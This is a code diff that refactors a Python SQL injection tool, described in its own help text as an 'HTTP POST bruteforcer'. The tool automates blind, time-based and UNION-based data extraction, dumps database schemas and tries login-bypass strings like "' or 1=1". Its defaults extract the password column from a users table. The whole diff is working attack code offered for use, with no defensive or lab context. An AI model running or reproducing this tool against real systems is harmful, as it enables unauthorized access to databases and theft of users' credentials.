@@ -39,9 +39,11 @@ def check_url(url, payload):
         res = requests.post(url + '?' + get_data, data=post_data, cookies=cookies, headers=headers)
     else:
         res = requests.get(url + '?' + get_data, cookies=cookies, headers=headers)
-    
-    #print(get_data, post_data, cookies, headers)
-    #print(res.text)
+
+    if CONF['debug'] >= 1:
+        print(get_data, post_data, cookies, headers)
+    if CONF['debug'] >= 2:
+        print(res.text)
 
     return res
 
@@ -65,7 +67,7 @@ def blind_extract(url, val, data_length=20, charset=string.printable):
 
         for char in charset:
 
-            payload = f"{val}{CONF['breaker']} AND BINARY SUBSTRING({CONF['column']}, {idx}, 1) = '{char}'-- -"
+            payload = f"{val}{CONF['breaker']} AND BINARY SUBSTRING({CONF['column']}, {idx}, 1) = '{char}'{CONF['comment']}"
             result = check_url(url, payload)
             check = check_result(result)
 
@@ -83,8 +85,7 @@ def blind_data_length(url, val):
     data_length = 0
 
     while True:
-        payload = f"{val}{CONF['breaker']} AND length({CONF['column']}) >= {data_length + 1}-- -"
-        #print(payload)
+        payload = f"{val}{CONF['breaker']} AND length({CONF['column']}) >= {data_length + 1}{CONF['comment']}"
         result = check_url(url, payload)
         check = check_result(result)
 
@@ -100,7 +101,9 @@ def union_nb_columns(url, val):
     nb_columns = 0
 
     while True:
-        result = check_url(url, f"{val}{CONF['breaker']} ORDER BY {nb_columns+1}-- -")
+
+        payload = f"{val}{CONF['breaker']} ORDER BY {nb_columns+1}{CONF['comment']}"
+        result = check_url(url, payload)
         check = check_result(result)
 
         if check:
@@ -117,11 +120,11 @@ def union_readable_column(url, nb_columns, val):
     tab_placeholder = [str(x) * 10 for x in range(nb_columns)]
     fields = ','.join(tab_placeholder)
 
-    #result = check_url(url, f"{val}{CONF['breaker']} UNION SELECT {fields} FROM {CONF['table']} LIMIT 0,1-- -")
-    result = check_url(url, f"{val}{CONF['breaker']} UNION SELECT {fields}-- -")
+    result = check_url(url, f"{val}{CONF['breaker']} UNION SELECT {fields}{CONF['comment']}")
     
     for x in range(len(tab_placeholder)):
-        if tab_placeholder[x] in result.text:
+        idx = result.text.find(tab_placeholder[x])
+        if idx != -1 and idx == result.text.rfind(tab_placeholder[x]):
             tab_readable.append(x)
 
     if len(tab_readable) > 0:
@@ -129,18 +132,25 @@ def union_readable_column(url, nb_columns, val):
 
     return -1
 
-
 def union_extract(url, nb_columns, val, idx_column=0, limit_start=0, limit_count=500):
     data_found = ''
 
     column = CONF['column'].split(',')
     sep_line = CONF['sep_line'].encode().hex()
     sep_col = CONF['sep_col'].encode().hex()
-
     column = f"CONCAT(0x{sep_line},{(',0x'+sep_col+',').join(column)},0x{sep_line})"
-    fields = ('1,' * idx_column) + column + (',1' * (nb_columns-1-idx_column))
+    
+    #classique
+    #fields = ('1,' * idx_column) + column + (',1' * (nb_columns-1-idx_column))
+    #payload = f"{val}{CONF['breaker']} UNION SELECT {fields} FROM {CONF['table']}{CONF['comment']}"
+    
+    #embedded
+    fields = f"{'1,' * idx_column}(SELECT {column} FROM {CONF['table']} LIMIT {limit_start}, 1){',1' * (nb_columns-1-idx_column)}"
+    payload = f"{val}{CONF['breaker']} UNION SELECT {fields}{CONF['comment']}"
 
-    result = check_url(url, f"{val}{CONF['breaker']} UNION SELECT {fields} FROM {CONF['table']} LIMIT {limit_start}, {limit_count}-- -")
+    #payload = f"{val}{CONF['breaker']} UNION SELECT {fields} FROM {CONF['table']} LIMIT {limit_start}, {limit_count}{CONF['comment']}"
+
+    result = check_url(url, payload)
     check = check_result(result)
 
     tab_final = []
@@ -164,7 +174,7 @@ def time_extract(url, val, data_length=20, charset=string.printable):
 
             start_time = time.time()
 
-            payload = f"{val}{CONF['breaker']} AND IF (BINARY SUBSTRING({CONF['column']}, {idx}, 1) = '{char}', sleep({CONF['time_delay']}), 'false')-- -"
+            payload = f"{val}{CONF['breaker']} AND IF (BINARY SUBSTRING({CONF['column']}, {idx}, 1) = '{char}', sleep({CONF['time_delay']}), 'false'){CONF['comment']}"
             result = check_url(url, payload)
             #check = check_result(result)
 
@@ -183,7 +193,7 @@ def time_data_length(url, val):
 
         start_time = time.time()
 
-        payload = f"{val}{CONF['breaker']} AND IF (length({CONF['column']}) = {data_length}, sleep({CONF['time_delay']}), 'false')-- -"
+        payload = f"{val}{CONF['breaker']} AND IF (length({CONF['column']}) = {data_length}, sleep({CONF['time_delay']}), 'false'){CONF['comment']}"
         result = check_url(url, payload)
         #check = check_result(result)
 
@@ -194,50 +204,37 @@ def time_data_length(url, val):
     #payload = "1' AND (SELECT 8889 FROM (SELECT(SLEEP(5)))HhUy) AND 'lDLY'='lDLY"
 
 
-def msg_usage(name=None):
-    return f'''
-Basic : 
-    {name} -c 18 -a 10 -n 1
-Specify performance settings : 
-    {name} -c 18 -a 10 -n 1 -p 10 -d 9.6 -s 128
-Repeater stuff :
-    {name} -c 18 -a 10 -n 1 -x client
-'''
-
 
 print()
 parser = argparse.ArgumentParser(description='HTTP POST bruteforcer')
-parser.add_argument('-u', '--url', metavar='', required=True, help='URL to bruteforce')
-parser.add_argument('-m', '--method', metavar='', default='POST', choices=['GET','POST'], help='HTTP method to use')
+parser.add_argument('-u', '--url', required=True, help='URL to bruteforce')
+parser.add_argument('-x', '--headers', action='append', help='Additionnal headers, format HEADER:VALUE Use ^SQLI^ as placeholder')
+parser.add_argument('-c', '--cookies', action='append', help='Cookies. Standard format : NAME:VALUE Use ^SQLI^ as placeholder')
+parser.add_argument('-p', '--post-data', default='', help='POST body to send. Standard format : var1=val1&var2=val2 Use ^SQLI^ as placeholder')
+parser.add_argument('-g', '--get-data', default='', help='GET data to send. Standard format : var1=val1&var2=val2 Use ^SQLI^ as placeholder')
+parser.add_argument('-f', '--field', default='password', help='Field to extract')
+parser.add_argument('-t', '--table', default='users', help='Table to extract from')
+parser.add_argument('-m', '--method', default='POST', help='HTTP method to use')
+parser.add_argument('-a', '--action', default='', help='What do I do ? blind, union, login, time')
+parser.add_argument('-d', '--dump-schema', default=False, action='store_true', help='dump database schema')
+parser.add_argument('-v', '--value', default='', help='valid value')
+parser.add_argument('--debug', default=0, type=int, help='debug')
 
-group1 = parser.add_argument_group('Request parameters')
-group1.add_argument('-x', '--headers', metavar='', action='append', help='Additionnal headers, format HEADER=VALUE Use ^SQLI^ as placeholder')
-group1.add_argument('-c', '--cookies', metavar='', action='append', help='Cookies. Standard format : NAME=VALUE Use ^SQLI^ as placeholder')
-group1.add_argument('-p', '--post-data', metavar='', default='', help='POST body to send. Standard format : var1=val1&var2=val2 Use ^SQLI^ as placeholder')
-group1.add_argument('-g', '--get-data', metavar='', default='', help='GET data to send. Standard format : var1=val1&var2=val2 Use ^SQLI^ as placeholder')
-
-group2 = parser.add_argument_group('SQLi options')
-group2.add_argument('-f', '--field', metavar='', default='password', help='Field(s) to extract, (password or username,password)')
-group2.add_argument('-t', '--table', metavar='', default='users', help='Table to extract from')
-group2.add_argument('-a', '--action', metavar='', default='', choices=['blind','union','login','time'], help='Type of injection to execute')
-group2.add_argument('-v', '--value', metavar='', default='', help='Valid value used to check if SQLi is working')
-group2.add_argument('-debug', '--debug', metavar='', default=False, action='store_true', help='')
-group2.add_argument('-d', '--dump-schema', metavar='', default=False, action='store_true', help='Dump database schema')
-
-#group3 = parser.add_argument_group('Result detection')
-group3 = parser.add_mutually_exclusive_group('Result detection', required=True)
-group3.add_argument('-s', '--success', metavar='', help='Success string to look for')
-group3.add_argument('-e', '--error', metavar='', help='Error string to look for')
+group = parser.add_mutually_exclusive_group(required=True)
+group.add_argument('-s', '--success', metavar='MSG SUCCESS', help='Success string to look for')
+group.add_argument('-e', '--error', metavar='MSG ERROR', help='Error string to look for')
 #args = parser.parse_args()
 args, leftovers = parser.parse_known_args()
 
 
-CONF['breaker'] = "'"
+CONF['breaker'] = "" #"'"
 CONF['bad_value'] = '-1'
 CONF['sep_col'] = '|||'
 CONF['sep_line'] = '%%%'
 CONF['delay_request'] = 0.05
 CONF['time_delay'] = 2
+CONF['comment'] = "" #"-- -"
+CONF['debug'] = args.debug
 
 CONF['column'] = args.field
 CONF['table'] = args.table
@@ -249,7 +246,7 @@ CONF['method'] = args.method.upper()
 CONF['get_data'] = args.get_data
 CONF['post_data'] = args.post_data
 
-list_bypass = ["admin"+ CONF['breaker'] +"-- -", "admin"+ CONF['breaker'] +" and 1=1-- -", "admin"+ CONF['breaker'] +" or 1=1 limit 1"]
+list_bypass = ["admin"+ CONF['breaker'] + CONF['comment'], "admin"+ CONF['breaker'] +" and 1=1" + CONF['comment'], "admin"+ CONF['breaker'] +" or 1=1 limit 1", CONF['breaker'] +" or 1=1" + CONF['comment']]
 
 if args.cookies:
     for c in args.cookies:
@@ -263,20 +260,20 @@ if args.headers:
         if idx > -1:
             CONF['headers'][h[0:idx].strip()] = h[idx+1:].strip()
 
-
 if args.dump_schema:
     CONF['column'] = "table_name,column_name"
     CONF['table'] = "information_schema.columns where table_schema=database()"
 
 url = args.url
 print("[+] URL :", url)
-print("[+] CONF :", CONF)
 
+if CONF['debug'] >= 1:
+    print("[+] CONF :", CONF)
 
 if args.action == 'login':
 
     for bypass in list_bypass:
-        result = check_url(url, bypass, '')
+        result = check_url(url, bypass)
         check = check_result(result)
 
         if check:
